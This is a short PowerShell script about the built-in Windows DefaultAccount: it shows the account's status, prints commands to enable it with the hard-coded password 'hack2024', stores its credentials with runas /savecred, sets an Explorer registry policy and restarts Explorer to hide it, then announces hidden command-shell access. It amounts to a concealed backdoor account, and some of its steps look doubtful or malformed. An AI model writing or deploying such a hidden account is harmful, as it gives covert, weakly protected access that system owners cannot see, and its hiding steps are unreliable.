# Manage DefaultAccount (hide/enable info) - NO ADMIN
# Password: hack2024 (set after enable)

Write-Host "DefaultAccount Status:" -ForegroundColor Green
try {
    $user = Get-LocalUser -Name "DefaultAccount" -ErrorAction Stop
    Write-Host "  Enabled: $($user.Enabled)" -ForegroundColor Cyan
    Write-Host "  Description: $($user.Description)" -ForegroundColor Gray
} catch {
    Write-Host "  Not accessible (likely disabled)" -ForegroundColor Yellow
}

Write-Host "`nTo ENABLE (admin once): net user DefaultAccount /active:yes ^& net user DefaultAccount hack2024" -ForegroundColor Magenta

Write-Host "`nSave creds ^(needs enabled):" -ForegroundColor Yellow
Start-Process "runas" -ArgumentList "/user:DefaultAccount /savecred `"cmd /k echo DefaultAccount ready!`"" -Wait

Write-Host "`nHide from everywhere:" -ForegroundColor Green
$exp = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
New-Item $exp -Force -ErrorAction SilentlyContinue | Out-Null
Set-ItemProperty $exp "NoUserAdmins" -Value 1

Stop-Process explorer -Force
Start-Sleep 2
Start explorer

Write-Host "Hidden! Access: runas /user:DefaultAccount cmd" -ForegroundColor Cyan
Read-Host
